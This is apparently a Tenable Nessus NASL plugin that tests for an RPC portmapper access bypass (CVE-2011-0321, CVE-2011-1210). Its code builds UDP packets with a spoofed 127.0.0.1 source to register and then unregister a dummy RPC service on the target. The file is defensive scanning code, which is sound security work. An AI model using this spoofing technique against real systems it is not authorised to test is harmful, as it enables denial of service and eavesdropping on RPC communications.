#TRUSTED 9c9d7a5bb290db9db2eab69074996749d9270ae29c88320193d107e3e3c850170ccebfd9edaade30413a03f873d9535841663eaedd1023226232bd77c6a4e56bbaee39f0c17205c3907e558c9237b690cfe2fba2b58fd0d92b16c848849e7425fa6b75567c136731ef39a60df9470d7bcf46deb1a36b577c7c1ddd5551bd5d3009a9e52b58974191fd8ffe343e8896d320cd7d4d7f45fb018514c814908e755f764371f0fa390a543644699b96cd20b7683d64aaab651acb97bed278602a59b9f6f05951e606d3f3726a9da2d3ff669529dac2737df04588755a2a2bbc6a257ca801466a8f806c0674e8b3f33d68e9be52fd70fdd9fd0a8d07222077a27026205257c45f9f1f85bc9dc97785f7e073208f02fb605c16280a7fdcf19d1463ef78d87b65c1e2ed5d09a2249c454347adde9ed9e097fb12e2e0fa8f4763d8d6248d0e7e63a9eb0ff036f94fc9012d055acce66a954a885f97896c7b79b3380c0ee241e8c876dcb27a96ec98c75064a1e5aabf646f1d6967e843c7b0cd164dd2d31a507f3c7460ccd97b31a591d08de6423e82b412b03b5754b0326741a0406d8028fbefb561b122b72c232e25620f5afb3af88ff0dc0162018f62045c7c507c6bf6e81c6ddba67a79c12fc04ef28435bce1ce048050bf9f807038753f03cc8ecbd89a3e6545a9d37e2bdddb5e706d5698510094fff8a5863ffe829aa22a7dc8378f
#TRUST-RSA-SHA256 a0f084a36a90269d240e49e608a797e1359dd2e65c38e8e4b06642342d7563b6115c40a25b95923dfbf6ae1b8ae5088781b3a7866b5280c4e207f34642ce0e7e7bb219a3ca2deaee00b43f20ce74d65264d52789b51712c296c98ac83dfc57fc37c09d7cab6e300b2646016b97360cd3ae4e66f21b4490df7df50c25d118c8300c3ed3de5fe8628547d30a11719e597980dec54659b328cc57e5ec1581e975388309140e3a8f79da75ba65b155af536372dc9a2f883f8288316db2ad236a6b51ee5784bf4b1e9a59811db3079eba68a240c4b496b93ec05c5cc715997510cc4fef376b4141c41de5674fc7d534be0360b1f25479848718f16675fb542f26dfcec2d4cba53911bb26a8d830fc15dc292e84fbb9ba70ae7185a1ce63566e157504fb40fd483d0ae6613de88c8b9aae8285eb7fee02577ab0e469c8efa543909073bbf15c656ef13a7efa4822f61d2e7b4052f2be4ad37abbdd209b313f486e9634a3553a694a1a971ba8bf545545d9b9181da9e3bdc49cffe94170081556f568beecfd923da31572a6f2cb202446438f4baeed9b36ce05949a1cab5f599c2c90163b7dae903ed332e3c832988e8f8807e960cf8c8783096729a5c3edf57d38826bbda8089b41afc1086a004be8f1396178e04e86ea607855ac97623523a66b6a9efe0de37ae8481040c69387888bed955cebe0e62522c8e72c99b9f3de402604c2
#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(54586);
  script_version("1.17");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/10/17");

  script_cve_id("CVE-2011-0321", "CVE-2011-1210");
  script_bugtraq_id(46044, 47875);

  script_name(english:"Multiple Vendor RPC portmapper Access Restriction Bypass");

  script_set_attribute(attribute:"synopsis", value:
"The RPC portmapper on the remote host has an access restriction bypass
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The RPC portmapper running on the remote host (possibly included with
EMC Legato Networker, IBM Informix Dynamic Server, or AIX) has an
access restriction bypass vulnerability.

The service will only process pmap_set and pmap_unset requests that
have a source address of '127.0.0.1'.  Since communication is
performed via UDP, the source address can be spoofed, effectively
bypassing the verification process.  This allows remote,
unauthenticated attackers to register and unregister arbitrary RPC
services.

A remote attacker could exploit this to cause a denial of service or
eavesdrop on process communications.");
  script_set_attribute(attribute:"see_also", value:"https://www.zerodayinitiative.com/advisories/ZDI-11-168/");
  # http://web.archive.org/web/20121127215828/http://archives.neohapsis.com:80/archives/bugtraq/2011-01/att-0162/ESA-2011-003.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fca0dc65");
  script_set_attribute(attribute:"see_also", value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76179");
  script_set_attribute(attribute:"see_also", value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76177");
  script_set_attribute(attribute:"see_also", value:"http://www.ibm.com/support/docview.wss?uid=swg1IC76178");
  script_set_attribute(attribute:"see_also", value:"https://aix.software.ibm.com/aix/efixes/security/rpc_advisory.asc");
  script_set_attribute(attribute:"solution", value:
"Apply the relevant patch from the referenced documents for EMC Legato
Networker, IBM Informix Dynamic Server, or AIX.  If a different
application is being used, contact the vendor for a fix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2011-0321");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:informix");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:emc:legato_networker");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"RPC");

  script_copyright(english:"This script is Copyright (C) 2011-2023 Tenable Network Security, Inc.");

  script_dependencies("rpc_portmap.nasl", "rpcinfo.nasl");
  script_require_keys("Services/udp/rpc-portmapper");

  exit(0);
}

include("raw.inc");
include("sunrpc_func.inc");


var PMAP_SET = 1;
var PMAP_UNSET = 2;

# UDP port the portmapper is listening on
global_var portmap;

# info for the service we'll try to register
global_var port, prognum, versnum, proto;

##
# sends a pmap_set or pmap_unset (depending on 'proc')
# using a spoofed source address (localhost)
#
# exits if invalid argument provided to 'proc'
#
# @anonparam  proc  procedure (1 for set or 2 for unset)
##
function pmap_request()
{
  local_var proc, pmap_data, rpc_data, ip, udp, packet;
  proc = _FCT_ANON_ARGS[0];
  if (proc != PMAP_SET && proc != PMAP_UNSET)
    exit(1, "Unexpected procedure: " + proc);

  # this is the same for pmap_set and pmap_unset. pmap_unset ignores
  # the last two arguments, but they appear to be required anyway
  pmap_data =
    mkdword(prognum) +
    mkdword(versnum) +
    mkdword(proto) +
    mkdword(port);

  ip = ip(ip_dst:get_host_ip(), ip_src:'127.0.0.1', ip_p:IPPROTO_UDP);
  udp = udp(uh_dport:portmap, uh_sport:1000);
  rpc_data = rpc_packet(prog:100000, vers:2, proc:proc, data:pmap_data);
  packet = link_layer() + mkpacket(ip, udp, payload(rpc_data));
  inject_packet(packet:packet);
}

# plugin starts here

# make sure the PoC is only run once, in case there are
# multiple portmap services listening on the same host
var portmappers = get_kb_list('Services/udp/rpc-portmapper');
if (isnull(portmappers)) exit(1, "The 'Services/udp/rpc-portmapper' KB item is missing.");
portmappers = sort(make_list(portmappers));
portmap = portmappers[0];
if (nasl_level() >= 6600)
{
  var i, max_i = max_index(portmappers);
  var hostname = get_host_name();
  for (i = 0; i < max_i; i++)
  {
    portmap = portmappers[i];
    if (rules_validate_target(target:hostname, port:portmap))
      break;
  }
  if (i == max_i)
    exit(0, 'All the ports the plugin tried to use were prohibited by user-defined rules.');
}


port = 12345;
prognum = 847883;  # 400111-200099999 = unassigned
versnum = 2;
proto = 6;  #TCP

# make sure to get TCP and UDP services
var rpc_svcs = get_kb_list('Services*/rpc-*');

# make sure the program number of the service we'll attempt to register
# is not already registered
if (rpc_svcs)
{
  var key, match;
  foreach key (keys(rpc_svcs))
  {
    match = pregmatch(string:key, pattern:'/rpc-(.+)$');
    if (isnull(match))  # this should always match unless something's horribly wrong
      exit(1, 'Unexpected error parsing "' + key + '".');
    else if (match[1] == prognum)
      exit(1, 'Program number '+prognum+' is already registered.');
  }
}

# first, try to register a new service
pmap_request(PMAP_SET);

# see if it was registered
var res = get_rpc_port2(program:prognum, protocol:proto, portmap:portmap);

# then attempt to unregister it
pmap_request(PMAP_UNSET);

if (res == port)
  security_warning(port:portmap, proto:'udp');
else
  exit(1, 'Unable to determine if the service on UDP '+portmap+' is vulnerable.');

